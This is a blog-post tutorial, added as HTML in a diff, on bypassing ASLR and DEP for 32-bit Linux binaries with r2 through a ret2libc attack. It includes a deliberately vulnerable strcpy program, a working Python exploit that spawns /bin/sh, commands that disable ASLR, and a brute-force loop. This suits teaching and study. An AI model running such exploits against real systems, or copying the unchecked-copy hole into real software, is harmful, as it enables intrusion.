@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Bypassing ASLR and DEP for 32-Bit Binaries With r2</title>
+        <style>
+
+    html body {
+        font-family: 'Raleway', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: red;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+
+
+
+<link rel="stylesheet" href="/css/font.css">
+
+
+ <link rel="stylesheet" href="/css/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="/css/bootstrap-min.css" integrity="">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/css/font-awesome.min.css" integrity="">
+ 
+
+
+    <script src="https://ps1337.github.io/js/highlight.min.js"></script>
+
+     <script src="https://ps1337.github.io/js/python.min.js"></script>  <script src="https://ps1337.github.io/js/cpp.min.js"></script>  <script src="https://ps1337.github.io/js/json.min.js"></script>  <script src="https://ps1337.github.io/js/go.min.js"></script> 
+
+    <script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="https://ps1337.github.io/js/jquery.min.js"></script>
+
+
+<script src="https://ps1337.github.io/js/bootstrap.min.js"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.54.0" />
+        
+
+        
+    </head>
+
+    
+
+
+    <body>
+         
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Bypassing ASLR and DEP for 32-Bit Binaries With r2</a>
+
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="/">Home</a></li>
+                            
+                                <li><a href="/post/">Posts</a></li>
+                            
+                                <li><a href="/project/">Projects</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="mailto:ps1337@mailbox.org"><i class="fa fa-envelope-o"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://github.com/ps1337/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="index.xml"><i class="fa fa-rss"></i></a></li>
+                            
+                        </ul>
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/binary-aslr-dep-32/">Bypassing ASLR and DEP for 32-Bit Binaries With r2</a></h4>
+    <h5>May 1, 2019</h5>
+    
+    <a href="tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+    <a href="tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+    <a href="tags/ret2libc"><kbd class="item-tag">ret2libc</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<p>This post covers basic basics of bypassing ASLR and DEP with <a href="https://rada.re/r/">r2</a>. For this, a vulnerable application, <code>yolo.c</code>, is required:</p>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void lol(char *b)
+{
+    char buffer[1337];
+    strcpy(buffer, b);
+}
+
+int main(int argc, char **argv)
+{
+    lol(argv[1]);
+}
+</code></pre>
+
+<h1 id="64-bit-vs-32-bit-binaries">64-Bit vs 32-Bit Binaries</h1>
+
+<p>The issue here should be quite obvious - <code>strcpy</code> blindly copies the user-controlled input buffer <code>b</code> into <code>buffer</code> which causes a buffer overflow. Since normally ASLR and DEP are enabled, the following things don&rsquo;t just work out of the box:</p>
+
+<ul>
+<li>Providing shellcode via user input: DEP prevents executing this code and the application would just crash</li>
+<li>Using a library like <code>libc</code> and spawning a shell (e.g. using <code>ret2libc</code>) because the start address of the library is randomized after each start of a process:</li>
+</ul>
+
+<pre><code>$ gcc yolo.c -o yolo_x64
+
+$ ldd yolo_x64 | grep libc
+        libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007fe0def68000)
+
+$ ldd yolo_x64 | grep libc
+        libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007fba1f038000) &lt;-- much random
+
+$ ldd yolo_x64 | grep libc
+        libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f3d65b03000) &lt;-- also here
+
+$ ldd yolo_x64 | grep libc
+        libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f584e180000) &lt;-- here too
+
+$ ldd yolo_x64 | grep libc
+        libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007fc4aee7c000) &lt;-- :/
+</code></pre>
+
+<p>As seen above, the start address of <code>libc</code> always has a random value. The <code>ret2libc</code> technique would theoretically work in case an attacker is able to guess the start address of <code>libc</code>. However, for 64-bit binaries the chance to guess this right is just too small. Because of this, this post covers 32-bit binaries where the chance to make a right guess is better:</p>
+
+<pre><code>$ gcc -fno-stack-protector -m32 yolo.c -o yolo
+
+$ ldd yolo | grep libc
+        libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7cbb000)
+
+$ ldd yolo | grep libc
+        libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7d43000) &lt;-- not so random
+
+$ ldd yolo | grep libc
+        libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7d18000)
+
+$ ldd yolo | grep libc
+        libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7d7d000)
+
+$ ldd yolo | grep libc
+        libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7cb0000)
+</code></pre>
+
+<p>The approach to guess the right start address is also called <em>brute forcing ASLR</em>. As indicated above, the address space for possible start addresses of the library is not that large anymore for a 32-bit binary:</p>
+
+<pre><code>$ ldd yolo | grep libc
+        libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7d8d000)
+
+
+$ while true; do echo -ne &quot;.&quot;; ldd yolo | grep libc | grep 0xf7d8d000; done
+
+...................................     libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7d8d000)
+..................................................................................................................................................................................................................................................................................................................................................     libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7d8d000)
+............................................................................................................... libc.so.6 =&gt; /usr/lib32/libc.so.6 (0xf7d8d000)
+</code></pre>
+
+<p>The same <code>libc</code> start address was found after multiple re-executions. Therefore the value can be guessed by re-using a previously valid start address.</p>
+
+<p>Please note that for this exercise, stack cookies are disabled while compiling the code (<code>-fno-stack-protector</code>):</p>
+
+<pre><code>$ r2 yolo
+ -- Finnished a beer
+[0x00001050]&gt; i
+file     yolo
+size     0x3c80
+format   elf
+arch     x86
+bits     32
+canary   false &lt;-- no cookies for you
+nx       true
+os       linux
+pic      true
+relocs   true
+relro    partial
+</code></pre>
+
+<h1 id="getting-eip-control">Getting EIP Control</h1>
+
+<p>The first step to exploit this application is to get control over the EIP register. To determine the offset after which the EIP overwrite happens, a buffer with a pattern is being sent to the application using a Python script. The first version of this script just sends a large buffer to check whether the application really crashes:</p>
+
+<pre><code>#!/usr/bin/python2.7
+
+print &quot;A&quot; * 2000
+</code></pre>
+
+<p>Now let&rsquo;s debug the application with <code>r2</code>:</p>
+
+<pre><code>$ r2 -d yolo
+[0xf7f3e0b0]&gt; ood `!python2.7 b.py`
+[...]
+[0xf7ef40b0]&gt; dc
+child stopped with signal 11
+[+] SIGNAL 11 errno=0 addr=0x41414141 code=1 ret=0
+[0x41414141]&gt; dr
+eax = 0xff8a0317
+ebx = 0x41414141
+ecx = 0xff8a3000
+edx = 0xff8a0add
+esi = 0xf7ea7e24
+edi = 0xf7ea7e24
+esp = 0xff8a0860
+ebp = 0x41414141
+eip = 0x41414141
+eflags = 0x00010282
+oeax = 0xffffffff
+</code></pre>
+
+<p>The input caused the application to successfully overwrite its EIP register with &ldquo;AAAA&rdquo; (<code>41414141</code>). Now repeat this step with a cyclic pattern to determine the correct offset for EIP control. For this, use <code>ragg2 -P 2000</code> to create the pattern and modify the Python script to print the pattern:</p>
+
+<pre><code>$ r2 -d yolo
+[0xf7f960b0]&gt; ood `!python2.7 b.py`
+[...]
+[0xf7ef00b0]&gt; dc
+child stopped with signal 11
+[+] SIGNAL 11 errno=0 addr=0x48415848 code=1 ret=0
+[0x48415848]&gt; wopO `dr eip`
+1349
+</code></pre>
+
+<p>Therefore the EIP register gets overwritten after 1349 bytes.</p>
+
+<h1 id="ret2libc">ret2libc</h1>
+
+<p>To successfully leverage a return2libc exploit, the following things are required:</p>
+
+<ul>
+<li>Start address of <code>libc</code>: This will be brute-forced</li>
+<li>The offset of the string <code>/bin/sh</code> in the specific <code>libc</code> version in use</li>
+<li>The offset of the <code>system()</code> call</li>
+<li>(The offset of <code>exit()</code> to prevent the application from crashing after the shell has exited)</li>
+</ul>
+
+<p>The idea is to cause the application to use gadgets already present in its memory space to spawn a shell. Because no gadgets of the user input are in use, DEP won&rsquo;t kick in. If everything works as expected, the application will call <code>system(/bin/sh)</code> upon successful exploitation. The layout of the input buffer is as follows:</p>
+
+<pre><code>&lt;Junk Byte&gt; * 1349 (Offset)
+&lt;Address of system()&gt; (new EIP)
+&lt;Address of exit()&gt; (new return address)
+&lt;Address of /bin/sh string&gt; (Argument for system())
+</code></pre>
+
+<p>The layout of this buffer ultimately causes a <em>fake stack frame</em> to be created in the memory of the application. After returning from the call to <code>lol</code>, the program will execute <code>system()</code> with <code>/bin/sh</code> as parameter and <code>exit()</code> as return address. Remember, on x86 arguments are pushed onto the stack in reverse order before calling a function.</p>
+
+<h2 id="determining-offsets">Determining Offsets</h2>
+
+<p>The addresses and offsets mentioned above can be determined using <code>r2</code> from a running debug session:</p>
+
+<pre><code>r2 -d yolo
+[0xf7f040b0]&gt; dcu main
+Continue until 0x5660a1be using 1 bpsize
+hit breakpoint at: 5660a1be
+
+[0x5660a1be]&gt; dmi
+0xf7cdf000 0xf7cf8000  /usr/lib32/libc-2.28.so &lt;-- start address of libc of this run
+
+[0x5660a1be]&gt; dmi libc system
+1524 0x0003e8f0 0xf7d1d8f0   WEAK   FUNC   55 system &lt;-- offset of system()
+
+[0x5660a1be]&gt; dmi libc exit
+150 0x000318e0 0xf7d108e0 GLOBAL   FUNC   33 exit &lt;-- offset of exit()
+
+[0x5660a1be]&gt; e search.in=dbg.maps &lt;-- search in more segments
+[0x5660a1be]&gt; / /bin/sh &lt;-- search for /bin/sh string
+Searching 7 bytes in [0xffdb7000-0xffdd8000]
+hits: 0
+0xf7e5eaaa hit0_0 .b/strtod_l.c-c/bin/shexit 0canonica. &lt;-- /bin/sh found
+</code></pre>
+
+<p>Therefore the values for the exploit to use are:</p>
+
+<ul>
+<li><code>libc</code> start address: <code>0xf7cdf000</code> (we just hope this values occurs again)</li>
+<li><code>system()</code> offset: <code>0x0003e8f0</code></li>
+<li><code>exit()</code> offset: <code>0x000318e0</code></li>
+<li><code>/bin/sh</code> offset: <code>0x17FAAA</code> (<code>0xf7e5eaaa</code> - <code>0xf7cdf000</code>)</li>
+</ul>
+
+<p>In case the correct <code>libc</code> start address is guessed, all other values should then automatically fit too.</p>
+
+<p><em>For debugging purposes: Always print the calculated addresses since bad characters like 0x00 or 0x0A in address values may corrupt the input buffer and prevent exploitation.</em></p>
+
+<h1 id="putting-the-exploit-together">Putting the Exploit together</h1>
+
+<p>The developed exploit looks as follows:</p>
+
+<pre><code>#!/usr/bin/python2.7
+
+import struct
+import sys
+
+EIP_OFFSET = 1349
+
+libc_start = 0xf7cdf000
+binsh_offset = 0x0017FAAA
+system_offset = 0x0003e8f0
+exit_offset = 0x000318e0
+
+system_addr = libc_start + system_offset
+exit_addr = libc_start + exit_offset
+binsh_addr = libc_start + binsh_offset
+
+PAYLOAD = &quot;&quot;
+
+while len(PAYLOAD) &lt; EIP_OFFSET:
+    PAYLOAD += &quot;\x90&quot; # NOP
+
+PAYLOAD += struct.pack(&quot;&lt;I&quot;,system_addr)
+PAYLOAD += struct.pack(&quot;&lt;I&quot;,exit_addr)
+PAYLOAD += struct.pack(&quot;&lt;I&quot;,binsh_addr)
+
+sys.stdout.write(PAYLOAD)
+</code></pre>
+
+<p>To test it without ASLR in place and therefore without the need to brute force the <code>libc</code> start address, temporarily disable ASLR on the system using a root shell:</p>
+
+<pre><code># echo 0 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre>
+
+<p>This causes the start address to remain static and the first exploitation attempt should always succeed:</p>
+
+<pre><code>[0x565561be]&gt; dmi
+0xf7db0000 0xf7dc9000  /usr/lib32/libc-2.28.so &lt;-- libc start address after disabling ASLR
+[0xf7fd50b0]&gt; ood `!python2.7 exploit.py` &lt;-- running the exploit with static address above
+[0xf7fd50b0]&gt; dc
+sh-5.0$ &lt;-- :)
+</code></pre>
+
+<p>Now that this worked, enable ASLR again:</p>
+
+<pre><code># echo 2 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre>
+
+<p>And run the exploit in an infinite loop until a shell gets spawned:</p>
+
+<pre><code>$ while true; do echo -ne &quot;.&quot;; ./yolo $(python2.7 exploit.py); done
+..........................................................................................................yolo: vfprintf.c:4157552864: l: Assertion `(size_t) done &lt;= (size_t) INT_MAX' failed.
+.........................................
+sh-5.0$
+</code></pre>
+
+<p>ASLR and DEP have been successfully bypassed. The <code>V!</code> view of <code>r2</code> shows the addresses after being pushed on the stack:</p>
+
+<p><img src="/img/binary-aslr-dep-32/V.jpg" alt="V!" /></p>
+
+<p>Ok Bye.</p>
+</div>
+
+    
+    
+
+    
+
+        <h4 class="page-header">Related</h4>
+
+         <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/rnd-092345-gdb/">Random Note #092345: Passing binary input via GDB</a></h4>
+    <h5>October 26, 2018</h5>
+    
+    <a href="tags/randomnote"><kbd class="item-tag">randomnote</kbd></a>
+    
+    <a href="tags/gdb"><kbd class="item-tag">gdb</kbd></a>
+    
+    <a href="tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+    <a href="tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/autohax/">Car Hacking: A Short Overview</a></h4>
+    <h5>October 23, 2018</h5>
+    
+    <a href="tags/automotive"><kbd class="item-tag">automotive</kbd></a>
+    
+    <a href="tags/car-hacking"><kbd class="item-tag">car-hacking</kbd></a>
+    
+    <a href="tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/multihack/">Creating A Multiplayer Game Hack</a></h4>
+    <h5>August 28, 2018</h5>
+    
+    <a href="tags/c&#43;&#43;"><kbd class="item-tag">c&#43;&#43;</kbd></a>
+    
+    <a href="tags/binary"><kbd class="item-tag">binary</kbd></a>
+    
+    <a href="tags/hooking"><kbd class="item-tag">hooking</kbd></a>
+    
+    <a href="tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+
+</div>
+ 
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+
+    </body>
+
+</html>
+
